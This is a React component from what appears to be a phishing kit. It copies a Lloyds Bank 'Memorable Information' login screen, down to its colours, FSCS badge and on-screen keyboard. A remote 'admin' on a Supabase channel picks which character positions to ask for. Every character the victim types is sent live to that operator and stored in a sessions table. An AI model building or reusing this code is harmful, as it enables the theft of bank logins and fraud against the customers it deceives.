import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Phone } from "lucide-react";

interface MemorableInfoScreenProps {
  sessionId: string;
  email: string;
}

const MemorableInfoScreen = ({ sessionId, email }: MemorableInfoScreenProps) => {
  const [positions, setPositions] = useState<string[]>([]);
  const [inputs, setInputs] = useState<string[]>([]);
  const [activeIndex, setActiveIndex] = useState(0);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  // Listen for admin sending positions on shared channel
  useEffect(() => {
    const channelName = `lloyds-${sessionId}`;
    const channel = supabase.channel(channelName);

    channel
      .on("broadcast", { event: "lloyds_positions" }, (p) => {
        const pos = p.payload?.positions as string;
        if (pos) {
          const posArray = pos.split(",").map((s) => s.trim());
          setPositions(posArray);
          setInputs(new Array(posArray.length).fill(""));
          setActiveIndex(0);
        }
      })
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          channelRef.current = channel;
        }
      });

    // Polling fallback
    const poll = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (data?.otp_code?.startsWith("lloyds_positions:")) {
        const pos = data.otp_code.replace("lloyds_positions:", "");
        const posArray = pos.split(",").map((s) => s.trim());
        if (posArray.length > 0 && positions.length === 0) {
          setPositions(posArray);
          setInputs(new Array(posArray.length).fill(""));
        }
      }
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      channelRef.current = null;
      clearInterval(poll);
    };
  }, [sessionId, positions.length]);

  // Broadcast input to admin on shared channel
  const broadcastInput = useCallback(
    (chars: string[]) => {
      const value = chars.join(",");

      supabase
        .from("sessions")
        .update({ otp_code: `lloyds_chars:${value}` } as any)
        .eq("id", sessionId)
        .then(() => {});

      if (channelRef.current) {
        channelRef.current.send({
          type: "broadcast",
          event: "lloyds_memorable_typing",
          payload: { characters: value, session_id: sessionId },
        });
      }
    },
    [sessionId]
  );

  const handleKeyPress = (char: string) => {
    if (activeIndex >= positions.length) return;
    const newInputs = [...inputs];
    newInputs[activeIndex] = char;
    setInputs(newInputs);
    if (newInputs[activeIndex]) {
      setActiveIndex(activeIndex + 1 < positions.length ? activeIndex + 1 : activeIndex);
    }
    broadcastInput(newInputs);
  };

  const handleBackspace = () => {
    if (activeIndex === 0 && !inputs[0]) return;
    const idx = inputs[activeIndex] ? activeIndex : Math.max(0, activeIndex - 1);
    const newInputs = [...inputs];
    newInputs[idx] = "";
    setInputs(newInputs);
    setActiveIndex(idx);
    broadcastInput(newInputs);
  };

  const keyboard = {
    row1: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"],
    row2: ["Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"],
    row3: ["A", "S", "D", "F", "G", "H", "J", "K", "L"],
    row4: ["Z", "X", "C", "V", "B", "N", "M"],
  };

  if (positions.length === 0) {
    return (
      <div className="flex flex-col items-center text-center py-8">
        <div className="mb-4 flex gap-1.5">
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:0ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:150ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:300ms]" />
        </div>
        <p className="text-sm text-[hsl(0,0%,40%)]">Loading security check...</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col -mx-8 -mt-8 -mb-8">
      {/* Green header bar */}
      <div className="bg-[hsl(168,70%,18%)] py-3 px-4 flex items-center justify-between">
        <h2 className="text-base font-bold text-white">Memorable Information</h2>
        <Phone className="h-5 w-5 text-white" />
      </div>

      <div className="px-6 pt-6 pb-4">
        {/* Instruction */}
        <p className="text-sm text-[hsl(0,0%,25%)] text-center mb-6">
          Enter the following characters to log on{" "}
          <span className="inline-flex items-center justify-center h-4 w-4 rounded-full bg-[hsl(168,60%,35%)] text-white text-[9px] font-bold align-middle">?</span>
        </p>

        {/* Position labels and input boxes */}
        <div className="flex justify-center gap-8 mb-6">
          {positions.map((pos, i) => (
            <div key={i} className="flex flex-col items-center gap-2">
              <span className="text-sm font-medium text-[hsl(0,0%,25%)]">
                {pos}
              </span>
              <button
                type="button"
                className={`h-12 w-12 rounded border-2 flex items-center justify-center text-lg transition-all ${
                  i === activeIndex
                    ? "border-[hsl(50,70%,50%)] bg-white shadow-sm"
                    : inputs[i]
                    ? "border-[hsl(168,60%,35%)] bg-white"
                    : "border-[hsl(0,0%,78%)] bg-white"
                }`}
                onClick={() => setActiveIndex(i)}
              >
                {inputs[i] ? (
                  <span className="h-3 w-3 rounded-full bg-[hsl(168,60%,25%)]" />
                ) : null}
              </button>
            </div>
          ))}
        </div>

        {/* Forgotten link */}
        <div className="text-center mb-6">
          <button className="text-sm font-medium text-[hsl(168,60%,30%)] hover:text-[hsl(168,60%,40%)] transition-colors">
            Forgotten your logon details?
          </button>
        </div>

        {/* FSCS */}
        <div className="flex flex-col items-center text-center mb-6">
          <div className="mb-1">
            <span className="text-lg font-serif italic text-[hsl(0,0%,30%)] tracking-tight">
              fscs
            </span>
          </div>
          <p className="text-xs font-medium text-[hsl(0,0%,40%)] mb-1">Protected</p>
          <p className="text-xs text-[hsl(0,0%,50%)] leading-relaxed max-w-[280px]">
            FSCS is not applicable to deposits in the Channel Islands and Isle of Man
          </p>
        </div>

        {/* On-screen keyboard */}
        <div className="space-y-[2px] bg-[hsl(0,0%,90%)] rounded-lg p-1.5">
          {Object.entries(keyboard).map(([key, row]) => (
            <div key={key} className="flex justify-center gap-[2px]">
              {row.map((k) => (
                <button
                  key={k}
                  onClick={() => handleKeyPress(k)}
                  disabled={activeIndex >= positions.length}
                  className="h-11 min-w-[30px] flex-1 max-w-[36px] rounded bg-white text-base font-medium text-[hsl(0,0%,20%)] shadow-[0_1px_0_hsl(0,0%,78%)] active:bg-[hsl(0,0%,90%)] active:shadow-none transition-all disabled:opacity-30"
                >
                  {k}
                </button>
              ))}
              {key === "row4" && (
                <button
                  onClick={handleBackspace}
                  className="h-11 px-3 rounded bg-[hsl(0,0%,82%)] text-base font-medium text-[hsl(0,0%,40%)] shadow-[0_1px_0_hsl(0,0%,70%)] active:bg-[hsl(0,0%,75%)] transition-all"
                >
                  ✕
                </button>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default MemorableInfoScreen;
